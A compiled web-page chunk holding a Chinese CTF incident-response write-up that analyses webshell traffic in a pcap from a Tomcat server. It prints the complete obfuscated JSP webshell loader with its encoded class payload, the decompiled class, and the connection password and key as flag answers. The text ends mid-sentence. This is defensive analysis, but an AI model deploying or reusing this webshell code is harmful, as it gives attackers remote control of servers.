"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[5225],{54712:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>c,default:()=>h,frontMatter:()=>i,metadata:()=>a,toc:()=>d});const a=JSON.parse('{"id":"Xuanji/Incident Response/103","title":"\u67d0\u53d8\u5f02 Webshell \u6d41\u91cf\u5206\u6790","description":"First of all","source":"@site/docs/Xuanji/Incident Response/103.md","sourceDirName":"Xuanji/Incident Response","slug":"/Xuanji/Incident Response/103","permalink":"/Target-Machines-WriteUp/docs/Xuanji/Incident Response/103","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Xuanji/Incident Response/103.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Xuanji_Sidebar","previous":{"title":"\u7b49\u4fdd - windows\u7b49\u4fdd","permalink":"/Target-Machines-WriteUp/docs/Xuanji/Classified Protection/74"},"next":{"title":"\u9493\u9c7c\u4e8b\u4ef6\u5e94\u6025","permalink":"/Target-Machines-WriteUp/docs/Xuanji/Incident Response/94"}}');var s=t(74848),r=t(28453);const i={},c="\u67d0\u53d8\u5f02 Webshell \u6d41\u91cf\u5206\u6790",l={},d=[{value:"First of all",id:"first-of-all",level:2},{value:"1",id:"1",level:2},{value:"2",id:"2",level:2},{value:"3",id:"3",level:2},{value:"4",id:"4",level:2},{value:"5",id:"5",level:2},{value:"6",id:"6",level:2},{value:"7",id:"7",level:2},{value:"8",id:"8",level:2},{value:"9",id:"9",level:2},{value:"10",id:"10",level:2}];function o(e){const n={admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"\u67d0\u53d8\u5f02-webshell-\u6d41\u91cf\u5206\u6790",children:"\u67d0\u53d8\u5f02 Webshell \u6d41\u91cf\u5206\u6790"})}),"\n",(0,s.jsx)(n.h2,{id:"first-of-all",children:"First of all"}),"\n",(0,s.jsxs)(n.p,{children:["\u9898\u76ee\u63d0\u4f9b\u4e86\u4e00\u4e2a ",(0,s.jsx)(n.code,{children:"pcap"})," \u6d41\u91cf\u6355\u83b7\u6587\u4ef6\uff0c\u4ee5\u53ca\u4e00\u4e2a\u8fdc\u7a0b\u9776\u673a"]}),"\n",(0,s.jsx)(n.h2,{id:"1",children:"1"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u9ed1\u5ba2\u4e0a\u4f20\u7684\u6728\u9a6c\u6587\u4ef6\u540d\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u5bf9\u6d41\u91cf\u5305\u8fdb\u884c\u521d\u6b65\u6392\u67e5"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(91407).A+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(n.p,{children:"\u53ef\u4ee5\u53d1\u73b0\u5927\u91cf\u7684\u7578\u5f62 TCP \u8bf7\u6c42\uff0c\u53ef\u4ee5\u786e\u5b9a\u662f\u653b\u51fb\u8005\u7684 TCP SYN \u7aef\u53e3\u626b\u63cf\u6d41\u91cf"}),"\n",(0,s.jsx)(n.p,{children:"\u7ed3\u5408\u9898\u76ee\u4fe1\u606f\uff0c\u5b9a\u4f4d HTTP Stream \u8fdb\u884c\u8ddf\u8e2a\uff0c\u7531\u4e8e\u5df2\u7ecf\u4ece\u5148\u524d\u7684\u51e0\u4e2a HTTP \u4f1a\u8bdd\u5f97\u77e5\u662f Tomcat \u6846\u67b6"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(16615).A+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(n.p,{children:"\u90a3\u4e48 HTTP \u8fc7\u6ee4\u6389 GET \u65b9\u6cd5\uff0c\u5f97\u5230"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(567).A+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(n.p,{children:"\u7ed3\u5408 Tomcat \u5e38\u89c1\u7684\u6f0f\u6d1e\u4fe1\u606f\uff0c\u5b9a\u4f4d\u5230\u8fd9\u6761\u8bf7\u6c42"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(20650).A+"",width:"2560",height:"1540"})}),"\n",(0,s.jsxs)(n.p,{children:["\u53ef\u4ee5\u770b\u5230\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\u4e3a ",(0,s.jsx)(n.code,{children:"hello.jsp"})]}),"\n",(0,s.jsx)(n.p,{children:"\u5373\u53ef\u786e\u5b9a\u7b54\u6848"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-flag",children:"flag{hello.jsp}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"2",children:"2"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u9ed1\u5ba2\u4e0a\u4f20\u7684\u6728\u9a6c\u8fde\u63a5\u5bc6\u7801\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u5c06\u5176\u4e2d\u7684\u8f7d\u8377\u63d0\u53d6\u51fa\u6765\uff0c\u5f97\u5230"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-java",children:'<%!\n    public static java.util.Map<String,Object> context = new java.util.HashMap<String,Object>();\n    public static byte[] b64Decode(String bs) {\n        Class base64;\n        byte[] value = null;\n        try {\n            base64 = Class.forName("java.util.Base64");\n            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);\n            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});\n        } catch (Exception e) {\n            try {\n                base64 = Class.forName("sun.misc.BASE64Decoder");\n                Object decoder = base64.newInstance();\n                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});\n            } catch (Exception f) { }\n        }\n        return value;\n    }\n\n    public static byte[] unc(byte[] cData) throws Exception{\n        java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();\n        java.io.ByteArrayInputStream in = new java.io.ByteArrayInputStream(cData);\n        java.util.zip.GZIPInputStream ungzip = new java.util.zip.GZIPInputStream(in);\n        byte[] buffer = new byte[256];\n        int n;\n        while ((n = ungzip.read(buffer)) >= 0)\n            out.write(buffer, 0, n);\n        return out.toByteArray();\n    }\n%><%\n    String u = "lgetwr";\n    if (context.get(u) != null) {\n        context.get(u).equals(new Object[]{request, response});\n    } else {\n        byte[] data = b64Decode("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");\n        byte[] cbs = unc(data);\n        java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[0],Thread.currentThread().getContextClassLoader());\n        java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,67,108,97,115,115}), new Class[]{byte[].class, int.class, int.class});\n        method.setAccessible(true);\n        Class clazz = (Class) method.invoke(classLoader, new Object[]{cbs, new Integer(0), new Integer(cbs.length)});\n        context.put(u, clazz.newInstance());\n    }\n%>\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u8fd9\u4efd webshell \u4e2d\uff0cBase64 \u7f16\u7801\u90e8\u5206\u4e3a Java Class \u6587\u4ef6"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(93739).A+"",width:"2560",height:"1371"})}),"\n",(0,s.jsx)(n.p,{children:"\u5bf9\u5176\u8fdb\u884c\u63d0\u53d6\u4e4b\u540e\u53cd\u7f16\u8bd1\uff0c\u5f97\u5230"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(99053).A+"",width:"2158",height:"1405"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-java",children:'package org.apache.coyote.module;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.zip.GZIPInputStream;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n/* loaded from: download.class */\npublic class ThrowableDeserializer extends ClassLoader {\n    private String a;\n    private HttpServletRequest b;\n    private HttpServletResponse c;\n    private Map<String, Object> d;\n    public static int e;\n    public static int f;\n    private static final String[] g = null;\n    private static final String[] h = null;\n\n    private String P() {\n        return "SjIHRC7oSVIE";\n    }\n\n    public String K() {\n        return "oszXCfTeXHpIkMS3";\n    }\n\n    private String C() {\n        return "9d127d5606ee03e479851bf2d4037ba7";\n    }\n\n    // JADX WARN: Code restructure failed: missing block\n\n    public void a(long r11, short r13) {\n        /*\n            Method dump skipped, instructions count: 1126\n            To view this dump change \'Code comments level\' option to \'DEBUG\'\n        */\n        throw new UnsupportedOperationException("Method not decompiled: org.apache.coyote.module.ThrowableDeserializer.a(long, short):void");\n    }\n\n    public ThrowableDeserializer() {\n        this.a = a(342748050 + 28731, (-342748050) - 15701, (int) 50427553776757L);\n        this.d = new HashMap();\n    }\n\n    public ThrowableDeserializer(ClassLoader classLoader) {\n        super(classLoader);\n        this.a = a(43946 + ((char) (-25610)), 1414900650 + 23000, (int) 132982192347163L);\n        this.d = new HashMap();\n    }\n\n    public Class a(byte[] bArr) {\n        return super.defineClass(bArr, 0, bArr.length);\n    }\n\n    public static byte[] a(int i, short s, short s2, String str) throws Exception {\n        long j = (i << 32) | ((s << 48) >>> 32) | ((s2 << 48) >>> 48);\n        byte[] bArr = null;\n        try {\n            Class<?> cls = Class.forName(a((-1931709660) - (-((char) (-7405))), 36060 - ((char) (-20106)), (int) j));\n            Object invoke = cls.getMethod(a((-1931709660) - (-((char) (-7404))), (-1931709660) - (-((char) (-10279))), (int) j), null).invoke(cls, null);\n            bArr = (byte[]) invoke.getClass().getMethod(a((-1931709660) - (-((char) (-7423))), 36060 - ((char) (-5179)), (int) j), String.class).invoke(invoke, str);\n        } catch (Exception e2) {\n            try {\n                Object newInstance = Class.forName(a((-1931709660) - (-((char) (-7427))), (-1931709660) - (-((char) (-6749))), (int) j)).newInstance();\n                bArr = (byte[]) newInstance.getClass().getMethod(a((-1931709660) - (-((char) (-7407))), 36060 - ((char) (-23617)), (int) j), String.class).invoke(newInstance, str);\n            } catch (Exception e3) {\n            }\n        }\n        return bArr;\n    }\n\n    /* JADX WARN: Multi-variable type inference failed */\n    /* JADX WARN: Type inference failed for: r0v10, types: [java.io.ByteArrayOutputStream] */\n    /* JADX WARN: Type inference failed for: r0v11, types: [java.lang.Throwable] */\n    /* JADX WARN: Type inference failed for: r0v12 */\n    /* JADX WARN: Type inference failed for: r0v7, types: [java.io.ByteArrayOutputStream] */\n    public static byte[] b(byte[] bArr) throws IOException {\n        ByteArrayOutputStream byteArrayOutputStream;\n        ByteArrayOutputStream byteArrayOutputStream2 = new ByteArrayOutputStream();\n        int i = f;\n        GZIPInputStream gZIPInputStream = new GZIPInputStream(new ByteArrayInputStream(bArr));\n        byte[] bArr2 = new byte[256];\n        do {\n            int read = gZIPInputStream.read(bArr2);\n            if (read < 0) {\n                break;\n            }\n            byteArrayOutputStream = byteArrayOutputStream2;\n            if (i != 0) {\n                break;\n            }\n            try {\n                byteArrayOutputStream.write(bArr2, 0, read);\n                byteArrayOutputStream = i;\n            } catch (IOException unused) {\n                throw byteArrayOutputStream;\n            }\n        } while (byteArrayOutputStream == 0);\n        byteArrayOutputStream = byteArrayOutputStream2;\n        return byteArrayOutputStream.toByteArray();\n    }\n\n    public boolean equals(Object obj) {\n        Object[] objArr = (Object[]) obj;\n        this.b = (HttpServletRequest) objArr[0];\n        this.c = (HttpServletResponse) objArr[1];\n        a(112691429740965L>>> 16, (short) (((112691429740965L ^ 22845320023103L) << 48) >>> 48));\n        return false;\n    }\n\n    private static String a(int i, int i2, int i3) {\n        int i4;\n        int i5 = ((i ^ i3) ^ 24499) & 65535;\n        if (h[i5] == null) {\n            char[] charArray = g[i5].toCharArray();\n            switch (charArray[0] & 255) {\n                case 0:\n                    i4 = 203;\n                    break;\n                // \u6839\u636e charArray[0] \u5bf9 i4 \u8fdb\u884c\u8d4b\u503c\n            }\n            int i6 = i4;\n            int i7 = i2 ^ i3;\n            int i8 = (i7 & 255) - i6;\n            if (i8 < 0) {\n                i8 += 256;\n            }\n            int i9 = ((i7 & 65535) >>> 8) - i6;\n            if (i9 < 0) {\n                i9 += 256;\n            }\n            for (int i10 = 0; i10 < charArray.length; i10++) {\n                int i11 = i10 % 2;\n                int i12 = i10;\n                char c = charArray[i12];\n                if (i11 == 0) {\n                    charArray[i12] = (char) (c ^ i8);\n                    i8 = (((i8>>> 3) | (i8 << 5)) ^ charArray[i10]) & 255;\n                } else {\n                    charArray[i12] = (char) (c ^ i9);\n                    i9 = (((i9>>> 3) | (i9 << 5)) ^ charArray[i10]) & 255;\n                }\n            }\n            h[i5] = new String(charArray).intern();\n        }\n        return h[i5];\n    }\n}\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u540c\u65f6\uff0c\u5728 webshell \u4e2d\u770b\u5230\u4e86\u8fd9\u6b65\u64cd\u4f5c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-java",children:'java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,67,108,97,115,115}), new Class[]{byte[].class, int.class, int.class});\n\n// Decode ASCII\n\njava.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(new String(new byte[]{"defineClass"}), new Class[]{byte[].class, int.class, int.class});\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u5373\u53ef\u786e\u5b9a\u7b54\u6848"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-flag",children:"flag{SjIHRC7oSVIE}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"3",children:"3"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u5206\u6790\u9ed1\u5ba2\u4e0a\u4f20\u7684\u6728\u9a6c, \u627e\u5230\u6728\u9a6c\u901a\u4fe1 key \u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u4e0a\u9898\u4e2d"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-flag",children:"flag{oszXCfTeXHpIkMS3}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"4",children:"4"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"\u9ed1\u5ba2\u8fde\u63a5 webshell \u540e\u6267\u884c\u7684\u7b2c\u4e00\u6761\u547d\u4ee4\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u7ecf\u8fc7\u5bf9 webshell \u8fdb\u884c\u8c03\u8bd5\uff0c\u5e76\u7ed3\u5408\u4e00\u5b9a\u731c\u6d4b\uff0c\u53ef\u4ee5\u786e\u5b9a webshell \u7684\u901a\u4fe1\u52a0\u5bc6\u65b9\u5f0f\u4e3a AES+gzip"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(61993).A+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(n.p,{children:"\u5176\u89e3\u5bc6\u5f97\u5230\u7684\u662f Java Class 